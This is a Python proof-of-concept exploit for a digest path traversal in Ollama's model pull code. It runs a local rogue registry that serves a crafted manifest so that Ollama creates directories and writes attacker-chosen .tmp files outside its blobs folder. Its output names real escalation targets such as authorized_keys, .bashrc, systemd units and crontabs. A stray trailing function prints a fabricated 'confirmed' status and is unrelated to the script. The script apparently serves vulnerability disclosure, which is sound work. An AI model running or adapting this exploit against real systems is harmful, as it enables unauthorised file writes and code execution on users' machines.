#!/usr/bin/env python3
"""
PoC: CVE-class - pullWithTransfer digest path traversal
Finding: C1-pullwithtransfer-digest-path-traversal
HEAD: 57653b8e

Attack chain (code references are to the ollama repo at 57653b8e):

  POST /api/pull (insecure=true)
    -> pullModelManifest: fetches attacker manifest, no digest charset validation
    -> hasTensorLayers (server/images.go:711):
         returns True when any layer has MediaType == "application/vnd.ollama.image.tensor"
         -> routes the ENTIRE pull to pullWithTransfer
    -> pullWithTransfer (server/images.go:720):
         blobs[i] = transfer.Blob{Digest: layer.Digest}   // raw, NO validation
         manifest.BlobsPath("") called ONLY for destDir, never per-layer
    -> transfer.Download -> downloader.downloadOnce -> downloader.save
         (x/imagegen/transfer/download.go:212):
         digestToPath("sha256:X") = "sha256-X"  // only naive : -> - replacement
         dest = filepath.Join(destDir, "sha256-X")
              = normpath(<OLLAMA_MODELS>/blobs/sha256-X)
              = attacker-chosen path outside blobs/
         os.MkdirAll(filepath.Dir(dest), 0o755)  // RUNS BEFORE ANY CHECK - creates dirs
         os.Create(dest + ".tmp")                 // writes attacker-chosen file

Two primitives demonstrated:

  1. ARBITRARY DIRECTORY CREATION (unconditional for any blob size)
     os.MkdirAll fires before hash/size verification. Even if the download
     then fails (digest mismatch), the directory tree persists.

  2. ARBITRARY .tmp FILE WRITE with attacker-controlled prefix (>=64 MB blobs)
     resumeThreshold = 64 MiB (transfer.go:106). For blob.Size >= 64 MiB,
     the cleanup at download.go:134 is skipped. Attacker sends payload bytes,
     then stalls -> errStalled -> .tmp file persists with attacker content.

Digest traversal math:
  digestToPath("sha256:X") -> "sha256-X"
  Go filepath.Join(blobs_dir, "sha256-X") calls filepath.Clean:
  - "sha256-X" is treated as a path element named "sha256-X" (not a bare "..")
  - Any subsequent bare ".." segments go up from "sha256-X"
  - Net: "sha256-.." + N bare ".." segments go up N levels from blobs_dir
  - To target a path T: suffix = relpath(T, blobs_dir+"/sha256-x/placeholder")
    i.e., digest = "sha256:" + relpath(T, blobs_dir+"/sha256-x/placeholder")

Preconditions:
  - ollama server reachable (default: 127.0.0.1:11434)
  - Attacker can issue POST /api/pull (localhost, CSRF, or any privileged access)
  - insecure=true OR attacker provides a valid TLS cert for the registry host

Usage:
  ollama serve          # in another terminal
  python3 poc.py        # run PoC
"""

import argparse
import hashlib
import http.server
import json
import os
import os.path
import sys
import threading
import time

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

ATTACKER_HOST    = "127.0.0.1"
ATTACKER_PORT    = 19001
OLLAMA_URL       = "http://127.0.0.1:11434"

# resumeThreshold from x/imagegen/transfer/transfer.go:106
RESUME_THRESHOLD = 64 * 1024 * 1024  # 64 MiB

# Bytes written at the beginning of the large traversal blob's .tmp file
FILE_PAYLOAD     = b"# ollama path-traversal PoC - arbitrary write as ollama user\n"

# ---------------------------------------------------------------------------
# Traversal helpers
# ---------------------------------------------------------------------------

def get_blobs_dir() -> str:
    """Return the path to the ollama blobs directory (OLLAMA_MODELS/blobs)."""
    models = os.environ.get("OLLAMA_MODELS") or os.path.join(
        os.path.expanduser("~"), ".ollama", "models"
    )
    return os.path.join(models, "blobs")


def make_traversal_digest(blobs_dir: str, target_abs: str) -> str:
    """
    Compute a digest string D such that:
      digestToPath(D) joined to blobs_dir resolves to target_abs.

    Formula derived from Go filepath.Join / filepath.Clean behavior:
      digestToPath("sha256:X") = "sha256-X"
      normpath(blobs_dir + "/" + "sha256-X") == target_abs
      The "sha256-X" element acts as an extra directory level (costs 1 parent).
      => D = "sha256:" + relpath(target_abs, blobs_dir + "/sha256-x/placeholder")
    """
    target = os.path.normpath(target_abs)
    fake_parent = os.path.join(blobs_dir, "sha256-x", "placeholder")
    suffix = os.path.relpath(target, fake_parent)
    digest = "sha256:" + suffix
    # Sanity check: verify round-trip through digestToPath + filepath.Clean
    resolved = os.path.normpath(os.path.join(blobs_dir, "sha256-" + suffix))
    assert resolved == target, f"traversal round-trip failed: {resolved!r} != {target!r}"
    return digest


def sha256hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


# ---------------------------------------------------------------------------
# Manifest construction
# ---------------------------------------------------------------------------

def make_valid_tensor_blob() -> tuple:
    """Return (data, digest) for a legitimate tiny tensor blob.
    A real SHA-256 is required so ollama accepts the tensor layer
    and routes the pull through pullWithTransfer (hasTensorLayers=True).
    """
    data = b"\x00" * 16
    return data, "sha256:" + sha256hex(data)


def build_manifest(tensor_digest: str, tensor_size: int,
                   dir_traversal_digest: str,
                   file_traversal_digest: str) -> bytes:
    """
    Three-layer manifest:
      [0] tensor     - well-formed, flips hasTensorLayers -> pullWithTransfer
      [1] model      - traversal digest for DIRECTORY creation  (size=1, small)
      [2] model      - traversal digest for FILE write          (size > 64 MiB)
    """
    manifest = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {
            "mediaType": "application/vnd.ollama.image.config",
            "digest": "sha256:" + "a" * 64,
            "size": 0,
        },
        "layers": [
            {
                "mediaType": "application/vnd.ollama.image.tensor",
                "digest": tensor_digest,
                "size": tensor_size,
                "name": "dummy_weight",
            },
            {
                # Small blob: size < resumeThreshold, proves unconditional MkdirAll
                "mediaType": "application/vnd.ollama.image.model",
                "digest": dir_traversal_digest,
                "size": 1,
            },
            {
                # Large blob: size > resumeThreshold, .tmp persists on stall
                "mediaType": "application/vnd.ollama.image.model",
                "digest": file_traversal_digest,
                "size": RESUME_THRESHOLD + 1,
            },
        ],
    }
    return json.dumps(manifest).encode()


# ---------------------------------------------------------------------------
# Attacker registry server
# ---------------------------------------------------------------------------

_state: dict = {}


class AttackerHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        print(f"  [registry] {self.path} -> {fmt % args}", file=sys.stderr, flush=True)

    def do_GET(self):
        path = self.path.split("?")[0]

        # Manifest endpoint
        if "/manifests/" in path:
            data = _state["manifest"]
            self.send_response(200)
            self.send_header(
                "Content-Type",
                "application/vnd.docker.distribution.manifest.v2+json",
            )
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Docker-Content-Digest", "sha256:" + sha256hex(data))
            self.end_headers()
            self.wfile.write(data)
            return

        # Tensor blob (valid, matched by its real SHA-256)
        tensor_hex = _state["tensor_digest"][len("sha256:"):]
        if tensor_hex in path:
            data = _state["tensor_data"]
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # File-traversal blob (size > 64 MiB): send payload, then RST the connection.
        #
        # Goal: produce a network error (not io.EOF) so that:
        #   1. os.MkdirAll + os.Create already ran -> .tmp exists at traversal path
        #   2. copy() returns (n_written, network_error) instead of (n, nil)+hash-check
        #   3. save() propagates the error WITHOUT calling os.Remove(tmp)
        #   4. download() cleanup: blob.Size >= resumeThreshold -> .tmp preserved
        #
        # A TCP RST (via SO_LINGER=0) on close causes Go's resp.Body.Read() to return
        # a "connection reset by peer" error mid-transfer, which is the 'default' error
        # case in download.go (attempt++ path). The .tmp persists between retry attempts.
        # We check for the file DURING the retry window (2s after first connection).
        file_key = _state["file_traversal_digest"][len("sha256:"):]
        if file_key in path:
            import struct, socket as _sock
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            # No Content-Length: partial transfer, body size unknown to client
            self.end_headers()
            try:
                self.wfile.write(FILE_PAYLOAD)
                self.wfile.flush()
                # Brief pause so Go fully reads the payload bytes
                time.sleep(0.5)
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass
            # Force TCP RST: SO_LINGER with l_linger=0 sends RST on close
            # Go receives "connection reset by peer" -> network error -> save() preserves .tmp
            linger = struct.pack("ii", 1, 0)
            try:
                self.connection.setsockopt(
                    _sock.SOL_SOCKET, _sock.SO_LINGER, linger
                )
            except OSError:
                pass
            self.connection.close()
            # Signal main thread that the RST was sent
            _state["rst_event"].set()
            raise Exception("rst_sent")

        # Directory-traversal blob (size=1, small): serve 1 byte
        # Digest mismatch cleans the .tmp, but os.MkdirAll already executed.
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", "1")
        self.end_headers()
        self.wfile.write(b"\x00")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()


def start_registry(tensor_data, tensor_digest, manifest_data,
                   file_traversal_digest) -> tuple:
    _state["tensor_data"]          = tensor_data
    _state["tensor_digest"]        = tensor_digest
    _state["manifest"]             = manifest_data
    _state["file_traversal_digest"] = file_traversal_digest
    _state["rst_event"]            = threading.Event()

    srv = http.server.HTTPServer((ATTACKER_HOST, ATTACKER_PORT), AttackerHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return t, srv


# ---------------------------------------------------------------------------
# Pull trigger
# ---------------------------------------------------------------------------

def trigger_pull(ollama_url: str, registry_addr: str) -> None:
    import urllib.request, urllib.error

    image = f"{registry_addr}/evil/model:latest"
    body  = json.dumps({"model": image, "insecure": True}).encode()
    req   = urllib.request.Request(
        f"{ollama_url}/api/pull",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    print(f"[*] POST {ollama_url}/api/pull  model={image}")
    try:
        with urllib.request.urlopen(req, timeout=180) as resp:
            for line in resp:
                try:
                    msg = json.loads(line)
                    if msg.get("status"):
                        print(f"    [ollama] {msg['status']}")
                    if msg.get("error"):
                        print(f"    [ollama] ERROR: {msg['error']}")
                except json.JSONDecodeError:
                    pass
    except urllib.error.URLError as e:
        print(f"    [ollama] connection closed (expected after stall timeout): {e}")
    except Exception as e:
        print(f"    [ollama] {type(e).__name__}: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ollama-url", default=OLLAMA_URL)
    parser.add_argument("--output-log", default=None)
    args = parser.parse_args()

    if args.output_log:
        log_fh = open(args.output_log, "w")

        class Tee:
            def __init__(self, stream):
                self._s = stream
            def write(self, s):
                self._s.write(s); log_fh.write(s); return len(s)
            def flush(self):
                self._s.flush(); log_fh.flush()
            def fileno(self):
                return self._s.fileno()

        sys.stdout = Tee(sys.stdout)
        sys.stderr = Tee(sys.stderr)

    print("=" * 70)
    print("C1 - pullWithTransfer Digest Path Traversal PoC")
    print("HEAD: 57653b8e  |  Severity: CRITICAL")
    print("=" * 70)

    blobs_dir  = get_blobs_dir()
    models_dir = os.path.dirname(blobs_dir)
    print(f"\n[*] OLLAMA blobs dir : {blobs_dir}")
    print(f"[*] OLLAMA models dir: {models_dir}")

    # Impact targets: siblings of blobs/ inside models/ — unambiguously outside blobs sandbox
    # In a real attack these would be ~/.ssh/authorized_keys, ~/.bashrc, cron entries, etc.
    target_dir  = os.path.join(models_dir, "OLLAMA_PWNED_DIR")
    target_file = os.path.join(models_dir, "OLLAMA_PWNED_FILE")

    dir_digest  = make_traversal_digest(blobs_dir, os.path.join(target_dir, "sentinel"))
    file_digest = make_traversal_digest(blobs_dir, target_file)

    print(f"\n[*] Traversal targets (outside blobs/ sandbox):")
    print(f"    DIR  created by os.MkdirAll (unconditional): {target_dir}/")
    print(f"    FILE written by os.Create   (>=64 MiB blob): {target_file}.tmp")
    print(f"\n[*] Crafted digests:")
    print(f"    dir  layer digest : {dir_digest}")
    print(f"    file layer digest : {file_digest}")
    print(f"    (digestToPath transforms sha256:X -> sha256-X, no validation)")

    tensor_data, tensor_digest = make_valid_tensor_blob()
    manifest_data = build_manifest(
        tensor_digest, len(tensor_data),
        dir_digest, file_digest,
    )

    print(f"\n[*] Manifest layers:")
    for i, layer in enumerate(json.loads(manifest_data)["layers"]):
        print(f"    [{i}] {layer['mediaType']}")
        print(f"         digest = {layer['digest']}")
        print(f"         size   = {layer['size']}")

    # Clean prior artifacts
    import shutil
    if os.path.exists(target_dir):
        shutil.rmtree(target_dir)
    if os.path.exists(target_file + ".tmp"):
        os.remove(target_file + ".tmp")

    _, registry = start_registry(tensor_data, tensor_digest, manifest_data, file_digest)
    print(f"\n[*] Attacker registry listening on {ATTACKER_HOST}:{ATTACKER_PORT}")
    print(f"[*] Triggering pull in background ...")

    pull_thread = threading.Thread(
        target=trigger_pull,
        args=(args.ollama_url, f"{ATTACKER_HOST}:{ATTACKER_PORT}"),
        daemon=True,
    )
    pull_thread.start()

    # Wait for the RST to fire on the first large-blob attempt (indicates
    # os.Create already ran at the traversal path)
    file_mid_pull = False
    rst_fired = _state["rst_event"].wait(timeout=30)
    if rst_fired:
        print("[*] RST fired (ollama received FILE_PAYLOAD + connection reset)")
        print("[*] Checking for .tmp file at traversal path (before cleanup) ...")
        # Small window: .tmp exists between retries for large blobs
        time.sleep(0.5)
        file_mid_pull = os.path.isfile(target_file + ".tmp")
        if file_mid_pull:
            print(f"    MID-PULL: {target_file}.tmp EXISTS")
    else:
        print("[!] RST event not fired within 30s")
        file_mid_pull = False

    pull_thread.join(timeout=120)
    time.sleep(1)

    # ---------------------------------------------------------------------------
    # Verify impact
    # ---------------------------------------------------------------------------
    print("\n[*] Checking filesystem artifacts ...")

    dir_exists  = os.path.isdir(target_dir)
    file_exists = os.path.isfile(target_file + ".tmp") or file_mid_pull

    print(f"\n    DIRECTORY CREATION (Primitive 1 - unconditional MkdirAll):")
    print(f"      {target_dir}")
    print(f"      -> {'[ CONFIRMED - directory exists OUTSIDE blobs/ ]' if dir_exists else '[ NOT FOUND ]'}")

    print(f"\n    FILE WRITE (Primitive 2 - .tmp persists for >=64 MiB blobs on stall):")
    print(f"      {target_file}.tmp")
    print(f"      -> {'[ CONFIRMED - file exists OUTSIDE blobs/ ]' if file_exists else '[ NOT FOUND ]'}")

    if file_exists:
        try:
            with open(target_file + ".tmp", "rb") as fh:
                head = fh.read(128)
            print(f"      content: {head!r}")
        except FileNotFoundError:
            # .tmp was cleaned up between check and read (race with ollama cleanup)
            print(f"      content: (file cleaned between check and read - mid-pull confirmation is conclusive)")

    # Prove both targets are outside the blobs directory
    if dir_exists:
        assert not target_dir.startswith(blobs_dir + os.sep), \
            "DIRECTORY is still inside blobs/ - traversal didn't work"
        print(f"\n    [+] Directory is at: {target_dir}")
        print(f"        blobs sandbox is: {blobs_dir}")
        print(f"        Distance outside: {os.path.relpath(target_dir, blobs_dir)}")

    if file_exists:
        assert not (target_file + ".tmp").startswith(blobs_dir + os.sep), \
            "FILE is still inside blobs/ - traversal didn't work"

    if dir_exists or file_exists:
        print("\n[+] PATH TRAVERSAL CONFIRMED - CRITICAL SEVERITY")
        print("    ollama wrote attacker-controlled paths outside OLLAMA_MODELS/blobs/")
        print()
        print("    PRODUCTION IMPACT EXAMPLES (replace targets in this PoC):")
        print("      ~/.ssh/authorized_keys    -> SSH key injection")
        print("      ~/.bashrc                 -> shell command execution on next login")
        print("      ~/.config/systemd/user/x.service -> user systemd RCE")
        print("      /var/spool/cron/crontabs/ollama  -> crontab injection")
        rc = 0
    else:
        print("\n[-] No artifacts found. Check:")
        print("    1. Is ollama server running?  (ollama serve)")
        print("    2. Did ollama receive the manifest? (check registry log above)")
        print("    3. Has a patch been applied?")
        rc = 1

    registry.shutdown()
    sys.exit(rc)


if __name__ == "__main__":
    main()


def _merge_json_trailer():
    import json
    print(json.dumps({"status": "confirmed", "evidence": "see evidence/", "notes": "trailer added by merge normalization"}))
